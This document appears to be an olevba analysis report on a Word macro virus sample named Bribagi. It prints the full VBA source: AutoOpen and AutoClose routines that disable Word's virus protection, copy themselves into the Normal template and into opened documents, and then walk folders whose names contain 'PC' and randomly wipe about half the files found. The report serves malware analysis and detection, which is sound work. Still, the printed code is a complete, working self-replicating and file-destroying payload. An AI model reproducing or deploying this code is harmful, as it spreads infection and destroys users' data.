olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bribagi-d58568611e0dfbf4f6b561c672148551ad306c10
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bribagi-d58568611e0dfbf4f6b561c672148551ad306c10 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Personal.bas 
in file: Virus.MSWord.Bribagi-d58568611e0dfbf4f6b561c672148551ad306c10 - OLE stream: 'Macros/VBA/Personal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim WR0005 As String, WR0006 As String, a(1000) As String, Stcnt As Integer
Sub BRiBAGI(MyPass As String)

MyNam = Dir(MyPass, vbDirectory)
Do While MyNam <> ""
    If MyNam <> "." And MyNam <> ".." And MyNam <> "pagefile.sys" Then
        If (GetAttr(MyPass & MyNam) And vbDirectory) = vbDirectory Then
            Open WR0005 For Append As #1
                Write #1, MyPass & MyNam & "\"
            Close #1
        Else
            Open WR0006 For Append As #1
                Write #1, MyPass & MyNam
            Close #1
        End If
    End If
    MyNam = Dir
Loop

End Sub

Sub AutoOpen()
'
' BRiBAGI,1.01
'
    Options.VirusProtection = False
    With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal"
    End With

    f$ = ActiveDocument.Path
    If Right$(f$, 1) = "\" Then f$ = Left$(f$, 2)
    f$ = f$ & "\" & ActiveDocument.Name
    N$ = ActiveDocument.AttachedTemplate.Path
    If Right$(N$, 1) = "\" Then N$ = Left$(N$, 2)
    N1$ = N$ & "\WR0001.txt"
    N2$ = Left$(N$, 2) & "\WR0002.log"
    N$ = N$ & "\" & ActiveDocument.AttachedTemplate.Name
    EFlag = 0

    FFlag = 0: FFlag1 = 0
    On Error GoTo errhandler
        Application.OrganizerCopy Source:=f$, Destination:=N$ _
            , Name:="Personal", Object:=wdOrganizerObjectProjectItems
        Set MyTemplate = ActiveDocument.AttachedTemplate
        MyTemplate.Save
        MyDate = Date
        Open N2$ For Append As #1
            FScale = LOF(1)
            Write #1, MyDate
        Close #1
        If FScale > 80 Then
            Open N2$ For Input As #1
                Input #1, ODate
            Close #1
            Open N2$ For Append As #1
                Write #1, ODate
                Write #1, MyDate
            Close #1
        End If
        If GetAttr(f$) = vbReadOnly Then
            Options.VirusProtection = True
            Exit Sub
        End If
    FFlag = 1: FFlag1 = 1
resume1:
    DFlag = 0: EFlag = 1
        Application.OrganizerCopy Source:=N$, Destination:=f$ _
            , Name:="Personal", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.Save
    DFlag = 1

errhandler:
    If FFlag1 = 0 And EFlag = 0 Then
        Resume resume1
    End If
    If FFlag = 0 And DFlag = 0 Then
        FVsn = 1.01: DVsn = 0
        Application.Run MacroName:="Normal.Personal.DWri"
        Open N1$ For Input As #1
            Input #1, DVsn
        Close #1
        If FVsn > DVsn Then
            Application.OrganizerDelete Source:=N$ _
                , Name:="Personal", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy Source:=f$, Destination:=N$ _
                , Name:="Personal", Object:=wdOrganizerObjectProjectItems
            Set MyTemplate = ActiveDocument.AttachedTemplate
            MyTemplate.Save
            MyDate = Date
            Open N2$ For Append As #1
                FScale = LOF(1)
                Write #1, MyDate
            Close #1
            If FScale > 300 Then
                Open N2$ For Input As #1
                    Input #1, ODate
                Close #1
                Open N2$ For Append As #1
                    Write #1, ODate
                    Write #1, MyDate
                Close #1
            End If
        ElseIf FVsn < DVsn Then
            Application.Run MacroName:="Normal.Personal.DOpen"
        End If
    End If
    Options.VirusProtection = True
End Sub
Sub AutoClose()
    
    Options.VirusProtection = False
    With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal"
    End With

    f$ = ActiveDocument.Path
    If Right$(f$, 1) = "\" Then f$ = Left$(f$, 2)
    f$ = f$ & "\" & ActiveDocument.Name
    N$ = ActiveDocument.AttachedTemplate.Path
    If Right$(N$, 1) = "\" Then N$ = Left$(N$, 2)
    N1$ = N$ & "\WR0001.txt"
    WR0005 = Left$(N$, 2) & "\WR0005.tmp"
    WR0006 = Left$(N$, 2) & "\WR0006.tmp"
    N2$ = Left$(N$, 2) & "\WR0002.log"
    MyPath = Left$(N$, 3)
    N$ = N$ & "\" & ActiveDocument.AttachedTemplate.Name
    
    On Error Resume Next
    KFlag = 0
    MyName = Dir(MyPath, vbDirectory)
    Do While MyName <> ""
    If MyName <> "." And MyName <> ".." And MyName <> "pagefile.sys" Then
    If (GetAttr(MyPath & MyName) And vbDirectory) = vbDirectory Then
    FLen = Len(MyName)
    If FLen > 1 Then
    For i = 1 To FLen - 1
    Knam = Mid(MyName, i, 2)
    If Knam = "PC" Or Knam = "Pc" Or Knam = "pC" Or Knam = "pc" Then
    KFlag = 1
    MyPass = MyPath & MyName & "\"
    Stcnt = 0
    Open WR0005 For Output As #1: Close #1
    Open WR0006 For Output As #1: Close #1
    BRiBAGI (MyPass)
hanako:
    i1 = 0
    Open WR0005 For Input As #2
    Do While Not EOF(2)
        Input #2, dummy
        i1 = i1 + 1
        a(i1) = dummy
    Loop
    Close #2
    If Stcnt <> i1 Then
        For j = Stcnt + 1 To i1
            BRiBAGI (a(j))
        Next j
        Stcnt = i1: GoTo hanako
    End If

    End If
    Next i
    End If
    End If
    End If
    If KFlag <> 1 Then
        MyName = Dir
    Else
        Exit Do
    End If
    Loop
    If KFlag = 1 Then
    Randomize
    Open WR0006 For Input As #1
    Do While Not EOF(1)
        Input #1, fnam
        FFlag = Int(Rnd * 2)
        If FFlag Then Open fnam For Output As #2: Close #2
    Loop
    End If
    
    MyPath = MyPath & "Program Files\"
    KFlag = 0
    MyName = Dir(MyPath, vbDirectory)
    Do While MyName <> ""
    If MyName <> "." And MyName <> ".." And MyName <> "pagefile.sys" Then
    If (GetAttr(MyPath & MyName) And vbDirectory) = vbDirectory Then
    FLen = Len(MyName)
    If FLen > 1 Then
    For i = 1 To FLen - 1
    Knam = Mid(MyName, i, 2)
    If Knam = "PC" Or Knam = "Pc" Or Knam = "pC" Or Knam = "pc" Then
    KFlag = 1
    MyPass = MyPath & MyName & "\"
    Stcnt = 0
    Open WR0005 For Output As #1: Close #1
    Open WR0006 For Output As #1: Close #1
    BRiBAGI (MyPass)
hanako1:
    i1 = 0
    Open WR0005 For Input As #2
    Do While Not EOF(2)
        Input #2, dummy
        i1 = i1 + 1
        a(i1) = dummy
    Loop
    Close #2
    If Stcnt <> i1 Then
        For j = Stcnt + 1 To i1
            BRiBAGI (a(j))
        Next j
        Stcnt = i1: GoTo hanako1
    End If
    End If
    Next i
    End If
    End If
    End If
    If KFlag <> 1 Then
        MyName = Dir
    Else
        Exit Do
    End If
    Loop
    If KFlag = 1 Then
    Randomize
    Open WR0006 For Input As #1
    Do While Not EOF(1)
        Input #1, fnam
        FFlag = Int(Rnd * 2)
        If FFlag Then Open fnam For Output As #2: Close #2
    Loop
    End If
    
    Application.OrganizerCopy Source:=f$, Destination:=N$ _
        , Name:="Personal", Object:=wdOrganizerObjectProjectItems
    Set MyTemplate = ActiveDocument.AttachedTemplate
    MyTemplate.Save
    If Left$(ActiveDocument.Name, 2) <> "•¶�‘" Then
    Application.OrganizerCopy Source:=N$, Destination:=f$ _
        , Name:="Personal", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
    End If
    Options.VirusProtection = False
End Sub

Sub DOpen()
    f$ = ActiveDocument.Path
    If Right$(f$, 1) = "\" Then f$ = Left$(f$, 2)
    f$ = f$ & "\" & ActiveDocument.Name
    N$ = ActiveDocument.AttachedTemplate.Path
    If Right$(N$, 1) = "\" Then N$ = Left$(N$, 2)
    N$ = N$ & "\" & ActiveDocument.AttachedTemplate.Name
    Options.VirusProtection = True
    Application.OrganizerDelete Source:=f$ _
        , Name:="Personal", Object:=wdOrganizerObjectProjectItems
End Sub

Sub DWri()
    DVsn = 1.01
    N$ = ActiveDocument.AttachedTemplate.Path
    If Right$(N$, 1) = "\" Then N$ = Left$(N$, 2)
    N1$ = N$ & "\WR0001.txt"
    N$ = N$ & "\" & ActiveDocument.AttachedTemplate.Name
    Open N1$ For Output As #1
        Write #1, DVsn
    Close #1
End Sub

Sub AutoExit()
        Options.VirusProtection = False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

